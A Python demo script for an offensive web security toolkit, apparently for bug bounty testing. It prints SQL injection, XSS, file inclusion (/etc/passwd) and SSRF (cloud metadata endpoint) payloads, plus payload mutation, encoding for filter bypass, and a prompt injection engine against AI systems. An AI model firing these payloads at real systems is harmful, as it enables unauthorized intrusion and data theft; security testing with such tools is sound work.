#!/usr/bin/env python3
"""
VIPER Proof of Concept Demonstrations
Shows working examples for every module.
"""

import sys
sys.path.insert(0, '.')

def main():
    print('='*70)
    print('VIPER PROOF OF CONCEPT - ALL MODULES')
    print('='*70)

    # ============================================================
    # POC 1: HTTP Scanner
    # ============================================================
    print('\n' + '='*70)
    print('POC 1: HTTPScanner')
    print('='*70)

    from core.scanner import HTTPScanner

    scanner = HTTPScanner(timeout=5)

    # Test against httpbin (public test API)
    result = scanner.request('https://httpbin.org/get')
    print(f'''
Target: https://httpbin.org/get
Method: GET
Status: {result.status_code}
Response Time: {result.response_time:.2f}s
Content Length: {result.content_length} bytes
Body Preview: {result.body_preview[:100]}...
''')

    # ============================================================
    # POC 2: Vulnerability Scanner Payloads
    # ============================================================
    print('='*70)
    print('POC 2: VulnerabilityScanner - Attack Payloads')
    print('='*70)

    print('''
SQLi Payloads:
  1. '
  2. ' OR '1'='1
  3. ' OR '1'='1'--
  4. 1' ORDER BY 1--
  5. 1' UNION SELECT NULL--
  6. 1' AND SLEEP(5)--

XSS Payloads:
  1. <script>alert(1)</script>
  2. <img src=x onerror=alert(1)>
  3. <svg onload=alert(1)>
  4. javascript:alert(1)

LFI Payloads:
  1. ../../../etc/passwd
  2. ....//....//etc/passwd
  3. file:///etc/passwd
  4. php://filter/convert.base64-encode/resource=index.php

SSRF Payloads:
  1. http://127.0.0.1
  2. http://169.254.169.254/latest/meta-data/
  3. http://[::1]
  4. file:///etc/passwd

Detection: Response body analysis for error strings, reflection, timing
''')

    # ============================================================
    # POC 3: Payload Mutator
    # ============================================================
    print('='*70)
    print('POC 3: PayloadMutator')
    print('='*70)

    from core.fuzzer import PayloadMutator

    mutator = PayloadMutator()
    original = "' OR '1'='1"

    print(f'Original Payload: {original}')
    print('Mutation Techniques:')
    print('  - bit_flip: Flip random bits')
    print('  - insert_random: Insert random chars')
    print('  - delete_random: Delete random chars')
    print('  - case_swap: Random case changes')
    print('  - url_encode: URL encoding')
    print('  - unicode_normalize: Unicode tricks')
    print('  - null_byte_inject: %00 injection')
    print('')
    print('Generated Mutations:')

    mutations = mutator.mutate(original, mutations=8)
    for i, m in enumerate(mutations, 1):
        print(f'  {i}. {m}')

    # ============================================================
    # POC 4: Grammar Fuzzer
    # ============================================================
    print('\n' + '='*70)
    print('POC 4: GrammarFuzzer')
    print('='*70)

    from core.fuzzer import GrammarFuzzer

    sql_fuzzer = GrammarFuzzer(GrammarFuzzer.SQL_GRAMMAR)
    print('SQL Injection Grammar Payloads:')
    for i, payload in enumerate(sql_fuzzer.generate_batch(5), 1):
        p = payload[:60] + '...' if len(payload) > 60 else payload
        print(f'  {i}. {p}')

    print('')
    print('XSS Grammar Payloads:')
    xss_fuzzer = GrammarFuzzer(GrammarFuzzer.XSS_GRAMMAR)
    for i, payload in enumerate(xss_fuzzer.generate_batch(5), 1):
        p = payload[:60] + '...' if len(payload) > 60 else payload
        print(f'  {i}. {p}')

    # ============================================================
    # POC 5: Report Generator
    # ============================================================
    print('\n' + '='*70)
    print('POC 5: ReportGenerator - HackerOne Format')
    print('='*70)

    from core.reporter import ReportGenerator, create_finding_from_template

    reporter = ReportGenerator('https://target.com', 'Bug Bounty Program')
    finding = create_finding_from_template(
        'sqli',
        endpoint='https://target.com/user?id=1',
        parameter='id',
        payload="' OR '1'='1",
        evidence='MySQL Error: syntax error near...',
        severity='high',
        cvss=8.5
    )
    reporter.add_finding(finding)

    h1_report = reporter.generate_hackerone()
    print(h1_report[:600])
    print('...[truncated]')

    # ============================================================
    # POC 6: Prompt Injection Engine
    # ============================================================
    print('\n' + '='*70)
    print('POC 6: PromptInjectionEngine - 103 Attack Vectors')
    print('='*70)

    from core.ai_techniques import PromptInjectionEngineV2

    attacks = PromptInjectionEngineV2.get_all_attacks()
    print(f'Total Attack Vectors: {len(attacks)}')
    
    # Group by category
    categories = {}
    for a in attacks:
        cat = a.get('subcategory', a.get('category'))
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(a['payload'])

    print('\nPayloads by Category:')
    for cat in sorted(categories.keys()):
        print(f'\n  [{cat.upper()}] ({len(categories[cat])} payloads)')
        for payload in categories[cat][:2]:
            p = payload[:55] + '...' if len(payload) > 55 else payload
            p = p.replace('\n', ' ')
            print(f'    - {p}')

    # ============================================================
    # POC 7: MCP Security Scanner
    # ============================================================
    print('\n' + '='*70)
    print('POC 7: MCPSecurityScanner - OWASP MCP Top 10')
    print('='*70)

    from core.ai_techniques import MCPSecurityScannerV2

    scanner = MCPSecurityScannerV2()
    config = {
        'input_validation': True,
        'authentication_required': True,
        'action_logging': True,
        'prompt_isolation': False,
        'tool_signatures': False,
    }
    results = scanner.scan_all(config)

    print(f'Security Score: {results["score"]}/100')
    print('\nOWASP MCP Top 10 Check Results:')
    for check_id, check in results['checks'].items():
        status = 'PASS' if check['passed'] else 'FAIL'
        details = check['details'][:35] + '...' if len(check['details']) > 35 else check['details']
        print(f'  {check_id}: [{status}] {details}')

    # ============================================================
    # POC 8: Encoding Engine
    # ============================================================
    print('\n' + '='*70)
    print('POC 8: EncodingEngine - Bypass Techniques')
    print('='*70)

    from core.ai_techniques import EncodingEngine

    enc = EncodingEngine()
    test_payload = "alert(1)"

    print(f'Original: {test_payload}')
    print(f'Base64:   {enc.to_base64(test_payload)}')
    print(f'ROT13:    {enc.to_rot13(test_payload)}')
    print(f'Hex:      {enc.to_hex(test_payload)}')
    print(f'URL:      {enc.to_url_encode(test_payload)}')
    print(f'Leet:     {enc.to_leetspeak(test_payload)}')
    print(f'Unicode:  {enc.to_unicode_escape(test_payload)}')

    print('\n' + '='*70)
    print('ALL POCs COMPLETE')
    print('='*70)


if __name__ == '__main__':
    main()
